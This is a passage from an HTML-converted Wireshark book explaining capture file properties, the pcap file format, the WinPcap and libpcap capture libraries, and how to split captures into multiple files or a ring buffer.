><o:p>&nbsp;</o:p></span></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="line-height:16.2500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >specific vendors or</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:17.2500pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="line-height:16.2500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >programs &#8212; IBM iSeries,</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:17.2500pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="line-height:16.2500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Windows Network</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:none;mso-border-bottom-alt:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:19.7000pt;" ><td width=302  valign=top  style="width:181.5000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=301  valign=top  style="width:180.7500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="line-height:16.7500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >Monitor, and so on.</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=175  valign=top  style="width:105.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:none;border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr></table><p class=MsoBodyText  style="margin-top:8.3500pt;margin-right:11.1500pt;" ><a name="_bookmark312" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With a capture file loaded, it is easy to find out a capture file&#8217;s format. In Wireshark, click on Statistics and choose Capture File Properties. The properties of the capture file will appear in a new dialog box (see<a name="_bookmark313" ></a>&nbsp;</span><span><a href="#_bookmark314" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-18</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section164" ><p class=MsoBodyText ><img width="776"  height="771"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker213075.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark314" ></a><span><a href="#_bookmark313" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-18:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Properties of a capture file</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Additionally, at the command line, you can type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >capinfos</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, followed by the capture file in question, to report file information.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="173"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker213280.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section165" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:346.0000px;" ><img width="763"  height="346"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker213308.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:5.2500pt;margin-right:10.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Effectively, pcap is a means of serializing network traffic data, although it can be used to serialize anything. It is just an ordering of bytes that are given meaning by the standard. A good reference for the pcap format is on the Wireshark wiki, at </span><span><a href="https://wiki.wireshark.org/Development/LibpcapFileFormat" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >https://wiki.wireshark.org/Development/LibpcapFileFormat</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. It is actually a pretty simple file format. There is a global header that includes a magic number (how applications identify it is a pcap file), the version of pcap the file is in, time zone offset, the accuracy of the timestamps (for example seconds versus microseconds), the snap length, which is the amount of data to capture for each packet, and, finally, the type of network the packet data was captured from (Ethernet, IP, and so on).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;margin-right:8.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This global header is then followed by the packet header of the first packet. There is a packet header for each packet captured. The packet header contains metadata about the packet, such as the timestamp in seconds and microseconds, length of the packet data captured, and actual length of the packet. If you remember earlier, this explains why the Packet Details pane contains a Frame column that tells you the number of bytes captured versus the number of bytes that were actually transmitted. Wireshark is able to parse this all out from the pcap file. After the pcap header you have the actual packet/frame data. What is awesome about pcap is that it is actually a really simple format, which means it is easy to build your own pcap files even without some sort of high-level library. This is actually the approach</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section166" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >we took for some of the custom sniffing applications developed during this book.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now that you understand pcap, it should be clear that when doing live sniffing, Wireshark is reading in pcap-formatted data from Dumpcap. How Dumpcap gets data from the actual network card differs depending on the operating system and even the network type and network card being used. In Windows, you are almost always going to be using WinPcap. WinPcap is the library that allows you to actually capture raw packet data from your network card and then formats it into the pcap format. In Windows, Dumpcap is going to be using the WinPcap library, whereas on Linux it is generally going to use libpcap. Libpcap is the original packet capture library, used for virtually any</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >*nix systems and is a programming library that allows you to get raw network data formatted into pcap. (libpcap developers actually invented the pcap format.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Ring Buffers and Multiple Files</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:10.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark is capable of spreading the captured data over </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >multiple capture </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >files. This is good when you intend to keep the capture running for some time or when <a name="_bookmark316" ></a>you know you are going to be capturing a lot of traffic. Working with multiple, smaller capture files is far easier than wrestling with a resource intensive, large or ongoing packet capture. And waiting for a very large capture file to open or save out to the hard drive can eat up precious time and resources as well. Finally, if you&#8217;re planning to continuously capture, then saving to multiple files allows you to work with one file or share it with a coworker, all without interrupting the ongoing packet capture.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:15.0500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Configuring Multiple Files</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Spreading a capture over multiple files can be handy for a few reasons. Disk space may be scarce, for example, or you may need only recent traffic for your analysis. You might want to e-mail a capture file but need to divide it to be a maximum size. Or perhaps you&#8217;re dealing with an extreme amount of traffic or need files to be divided often. Think of the reasons that would apply to you when deciding how large or how often you want to divide the captures.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section167" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:10.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark offers you the chance to divide files by size (KB, MB, or</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >GB) and/or by time (seconds, minutes, or hours). You can set it to divide by one or both conditions. Once the file exceeds either condition you select, the file is saved and a new capture file</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >begins.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="338"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker217340.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:5.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To configure saving to multiple files (with or without a ring buffer), follow these steps:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.5500pt;margin-right:16.4500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l11 level1 lfo9;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Open the Capture Options dialog box by selecting an interface</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and clicking Capture, then selecting</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Options.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.5500pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l11 level1 lfo9;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the Capture Options dialog box, select the Output</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >tab.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7500pt;margin-right:8.5000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l11 level1 lfo9;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Enter a base filename by clicking Browse and typing a filename</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and path. (A filename is</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >required.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.5500pt;margin-right:76.5500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l11 level1 lfo9;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >4.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Configure the options you want to use. (We select every</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.7500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >5 megabytes or every 5 minutes, whichever happens</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.5000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >first.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.6000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l11 level1 lfo9;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >5.<span>&nbsp;</span></span></span><![endif]><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="224"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker217812.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Click Start to start</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >capturing.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section168" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:6.3500pt;" ><a name="_bookmark317" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The steps we did are shown in<a name="_bookmark318" ></a>&nbsp;</span><span><a href="#_bookmark319" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-19</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. After clicking Start, you begin seeing packets scrolling up the Packet List pane. Wireshark is recording packets (</span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >capturing </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >them) and saving them to the first capture file. If you chose to use multiple files, the capture continues until the first capture file is complete. A file completes when it reaches a certain size or after the set time has passed, depending on the chosen option.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="782"  height="394"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker218308.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.3500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark319" ></a><span><a href="#_bookmark318" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-19:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Multiple file settings</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After the first capture file is finished, a new capture file begins. The scrolling packets in the Packet List pane does clear and reset, but no packets are lost in the capture process. Capturing continues for as long as you configured.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Finally, if you click the Options tab in the Wireshark: Capture Interfaces dialog box, you will see additional options to limit your capture, as shown in<a name="_bookmark320" ></a>&nbsp;</span><span><a href="#_bookmark322" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-20</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. You can instruct Wireshark to stop capturing after it reaches a number of files, or the files reach a certain size or after so much time. You can even instruct capturing to stop after a set number of packets is reached.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section169" ><p class=MsoBodyText ><img width="779"  height="394"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker219034.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark322" ></a><span><a href="#_bookmark320" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-20:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Stop capture options</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Configuring a Ring Buffer</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In addition to saving to multiple files, Wireshark can also use a </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >ring buffer </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >of multiple files to save the last megabytes of data captured or packets captured within a certain time period. This mode starts saving to a new file after a set amount of traffic has been captured or amount of time has passed, depending on your configuration. After you reach your chosen number of buffer files, the next saved file writes over the oldest buffer file. This process loops to keep the number of buffer files containing the most recent packet captures.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Let&#8217;s put all this information to good use in an 